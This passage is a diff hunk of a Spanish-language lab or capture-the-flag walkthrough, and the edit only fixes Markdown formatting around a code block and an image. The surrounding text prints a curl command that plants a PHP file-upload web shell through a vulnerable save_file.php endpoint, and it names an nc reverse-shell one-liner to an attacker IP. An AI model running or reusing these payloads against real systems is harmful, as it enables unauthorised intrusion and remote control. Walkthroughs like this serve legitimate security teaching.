@@ -39,9 +39,10 @@ Ahora subimos otra webshell, que nos permita subida de archivos para trabajar su
 
 ```
 curl '10.42.0.151/dapur/apps/app_theme/libs/save_file.php' --data 'content=<?php if(is_uploaded_file(@$_FILES["userfile"]["tmp_name"])) {move_uploaded_file($_FILES["userfile"]["tmp_name"], $_FILES["userfile"]["name"]);echo "Uploaded: <b>".$_FILES["userfile"]["name"]."</b>";}?><form enctype="multipart/form-data" action="" method="post"><input name="userfile" type="file"><input type="submit" value="Upload"></form>
-&src=upload.php'```
+&src=upload.php'
+```
 
-josie-upload.png"
+![](josie-upload.png)
 
 Podemos usar la opción “fácil” para hacer una shell reversa de b374k o utilizar la ejecución de comandos con `nc -e /bin/bash 10.42.0.201 8080`
 
